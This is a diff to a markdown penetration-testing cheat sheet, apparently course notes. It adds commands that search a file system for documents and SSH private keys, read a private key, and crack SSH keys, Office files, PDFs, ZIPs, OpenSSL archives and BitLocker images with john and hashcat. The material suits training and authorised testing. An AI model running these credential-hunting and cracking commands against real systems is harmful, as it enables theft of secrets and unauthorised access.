@@ -1068,14 +1068,63 @@ C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
 ```
 
 #### Linikatz
+Run it get all the hashes.
 
 ## Cracking Files
 ### Protected Files
-### Protected Archives
+### Hunting for Files
+```
+for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
+```
+### SSH
+#### Hunting for SSH Keys
+```
+grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
+```
+#### Encryoted SSH Key
+```
+cat /home/cry0l1t3/.ssh/SSH.private
+```
+#### Cracking SSH with John
+```
+ssh2john.py SSH.private > ssh.hash
+john --wordlist=rockyou.txt ssh.hash
+john ssh.hash --show
+```
+#### Cracking Documents with John
+```
+office2john.py Protected.docx > protected-docx.hash
+john --wordlist=rockyou.txt protected-docx.hash
+john protected-docx.hash --show
+```
+#### Cracking PDFs with John
+```
+pdf2john.py PDF.pdf > pdf.hash
+john --wordlist=rockyou.txt pdf.hash
+john pdf.hash --show
+```
 
-## Password Management
-### Password Policies
-### Password Managers
+
+### Protected Archives
+#### Cracking ZIp with John
+```
+zip2john ZIP.zip > zip.hash
+john --wordlist=rockyou.txt zip.hash
+john zip.hash --show
+```
+#### Cracking OpenSSL Encrypted Archives
+```
+file GZIP.gzip
+for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
+```
+#### Cracking BitLocker Encrypted Drives
+```
+bitlocker2john -i Backup.vhd > backup.hashes
+grep "bitlocker\$0" backup.hashes > backup.hash
+hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked
+```
+
+
 # Attacking Common Services
 
 # Pivoting, Tunneling, and Port Forwarding
